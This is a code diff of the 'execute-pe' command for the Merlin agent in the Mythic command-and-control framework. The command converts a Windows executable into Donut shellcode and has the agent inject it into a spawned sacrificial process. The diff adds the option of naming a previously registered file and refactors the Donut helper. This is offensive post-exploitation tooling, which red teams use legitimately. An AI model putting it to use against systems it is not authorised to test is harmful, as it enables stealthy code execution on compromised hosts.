@@ -1,9 +1,9 @@
 
+from merlin import donut, get_or_register_file, MerlinJob
 from mythic_payloadtype_container.MythicCommandBase import *
 from mythic_payloadtype_container.MythicRPC import *
-import os
 import json
-import subprocess
+import shlex
 
 # Set to enable debug output to Mythic
 debug = False
@@ -18,7 +18,7 @@ class ExecutePEArguments(TaskArguments):
                 type=ParameterType.File,
                 description="The Windows executable (PE file) you want to run",
                 ui_position=0,
-                required=True,
+                required=False,
             ),
             "arguments": CommandParameter(
                 name="executable arguments",
@@ -48,6 +48,18 @@ class ExecutePEArguments(TaskArguments):
         if len(self.command_line) > 0:
             if self.command_line[0] == '{':
                 self.load_args_from_json_string(self.command_line)
+            else:
+                # This allows an operator to specify the name of an a file that was previously registered with Mythic
+                # in place of providing the actual file
+                args = shlex.split(self.command_line)
+                if len(args) > 0:
+                    self.add_arg("executable_name", args[0], ParameterType.String)
+                if len(args) > 1:
+                    self.add_arg("arguments", args[1], ParameterType.String)
+                if len(args) > 2:
+                    self.add_arg("spawnto", args[2], ParameterType.String)
+                if len(args) > 3:
+                    self.add_arg("spawntoargs", args[3], ParameterType.String)
 
 
 class ExecutePECommand(CommandBase):
@@ -66,14 +78,34 @@ class ExecutePECommand(CommandBase):
     )
 
     async def create_tasking(self, task: MythicTask) -> MythicTask:
-        # Merlin jobs.MODULE
-        task.args.add_arg("type", 16, ParameterType.Number)
+        # Determine if a file or a file name was provided
+        if task.args.get_arg("executable") is None:
+            # A file WAS NOT provided
+            if task.args.has_arg("executable_name"):
+                executable_name = task.args.get_arg("executable_name")
+                executable_bytes = None
+            else:
+                raise Exception(f'A file or the name of a file was not provided')
+        else:
+            executable_name = json.loads(task.original_params)["executable"]
+            executable_bytes = task.args.get_arg("executable")
+
+        executable = await get_or_register_file(task, executable_name, executable_bytes)
+
+        # Donut
+        donut_args = {
+            "params": task.args.get_arg("arguments"),
+            "exit": "2",
+            "verbose": True,
+        }
+        donut_shellcode, donut_result = donut(executable, donut_args)
+        task.stdout += f'\n{donut_result}'
 
         # 1. Shellcode
         # 2. SpawnTo Executable
         # 3. SpawnTo Arguments (must include even if empty string)
         args = [
-            donut(task.args.get_arg("executable"), task.args.get_arg("arguments")),
+            donut_shellcode,
             task.args.get_arg("spawnto"),
             task.args.get_arg("spawntoargs")
         ]
@@ -84,11 +116,13 @@ class ExecutePECommand(CommandBase):
             "args": args,
         }
 
-        task.display_params = f'{json.loads(task.original_params)["executable"]} {task.args.get_arg("arguments")}\n ' \
-                              f'spawnto: {task.args.get_arg("spawnto")} {task.args.get_arg("spawntoargs")}'
+        task.display_params = f'{executable_name} {task.args.get_arg("arguments")}\n ' \
+                              f'SpawnTo: {task.args.get_arg("spawnto")} {task.args.get_arg("spawntoargs")}'
 
+        task.args.add_arg("type", MerlinJob.MODULE, ParameterType.Number)
         task.args.add_arg("payload", json.dumps(command), ParameterType.String)
         task.args.remove_arg("executable")
+        task.args.remove_arg("executable_name")
         task.args.remove_arg("arguments")
         task.args.remove_arg("spawnto")
         task.args.remove_arg("spawntoargs")
@@ -100,36 +134,3 @@ class ExecutePECommand(CommandBase):
 
     async def process_response(self, response: AgentResponse):
         pass
-
-
-def donut(executable, arguments):
-    donut_args = ['go-donut', '--in', 'input.exe', '--exit', '2']
-    if arguments:
-        donut_args.append('--params')
-        donut_args.append(arguments)
-
-    # Write file to location in container
-    with open('input.exe', 'wb') as w:
-        w.write(executable)
-
-    result = subprocess.run(
-        donut_args,
-        stdout=subprocess.PIPE
-    )
-
-    donut_bytes = bytes
-    # Read Donut output
-    with open('loader.bin', 'rb') as output:
-        donut_bytes = output.read()
-
-    # Close files
-    w.close()
-    output.close()
-
-    # Remove files
-    os.remove("input.exe")
-    os.remove("loader.bin")
-
-    # Return Donut shellcode Base64 encoded
-    return base64.b64encode(donut_bytes).decode("utf-8")
-
